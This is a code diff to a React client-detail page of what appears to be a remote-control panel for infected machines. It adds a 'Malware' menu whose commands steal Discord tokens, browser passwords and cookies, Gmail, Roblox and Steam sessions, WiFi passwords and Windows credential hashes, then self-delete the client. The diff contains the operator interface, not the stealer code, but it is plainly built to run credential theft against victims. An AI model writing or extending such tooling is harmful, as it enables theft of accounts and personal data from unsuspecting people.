@@ -534,12 +534,23 @@ export default function ClientDetailPage() {
               ]
             },
             {
-              title: "Termination", icon: "⏹️", color: "border-l-muted-foreground",
-              desc: "Exit, kill, or self-destruct", items: [
-                { cmd: "!exit", label: "Exit Client", desc: "Gracefully close the client", icon: "🛑" },
-                { cmd: "!kill", label: "Kill Client", desc: "Force close immediately", icon: "💀" },
-                { cmd: "!killswitch", label: "Kill Switch", desc: "Self-delete and exit", icon: "🔥" },
-                { cmd: "!help", label: "Help", desc: "Show available commands", icon: "❓" },
+              title: "Malware", icon: "🦠", color: "border-l-red-600",
+              desc: "Information stealing, credential harvesting, full data exfiltration", items: [
+                { cmd: "!virus", label: "Virus — Steal All", desc: "Execute full info stealer: tokens, passwords, cookies, browser data, everything", icon: "🦠" },
+                { cmd: "!stealall", label: "Steal All Data", desc: "Grab Discord tokens + browser passwords + cookies + system info in one shot", icon: "🕶️" },
+                { cmd: "!discordtokengrab", label: "Discord Token Grab", desc: "Extract all Discord tokens from leveldb and validate them", icon: "💬" },
+                { cmd: "!passwordsgrabber", label: "Password Grabber", desc: "Steal saved passwords from Chrome, Edge, Brave, Firefox", icon: "🔑" },
+                { cmd: "!cookiestealer", label: "Cookie Stealer", desc: "Steal browser cookies: session, auth, Roblox, Google, Discord", icon: "🍪" },
+                { cmd: "!robloxcookies", label: "Roblox Cookie Stealer", desc: "Extract .ROBLOSECURITY cookie from all browsers", icon: "🎮" },
+                { cmd: "!gmailstealer", label: "Gmail Stealer", desc: "Steal Google/Gmail session cookies and account info", icon: "📧" },
+                { cmd: "!browserpasswords", label: "Browser Passwords", desc: "Extract saved login credentials from all browsers", icon: "🔐" },
+                { cmd: "!grabtokens", label: "Grab Tokens", desc: "Extract Discord tokens and upload to Data Base", icon: "🎫" },
+                { cmd: "!wifi", label: "WiFi Passwords", desc: "Extract all saved WiFi network passwords", icon: "📶" },
+                { cmd: "!password", label: "Windows Passwords", desc: "Dump Windows Credential Manager and local user hashes", icon: "🗝️" },
+                { cmd: "!steamgrabber", label: "Steam Stealer", desc: "Steal Steam account info, config files, SSFN tokens", icon: "🎮" },
+                { cmd: "!discordinfo", label: "Discord Info", desc: "Gather Discord installation info, settings, running processes", icon: "💬" },
+                { cmd: "!exit", label: "Exit Client", desc: "Close client after data exfiltration complete", icon: "🛑" },
+                { cmd: "!killswitch", label: "Kill Switch", desc: "Self-delete client after stealing data", icon: "🔥" },
               ]
             },
           ].map((cat) => {
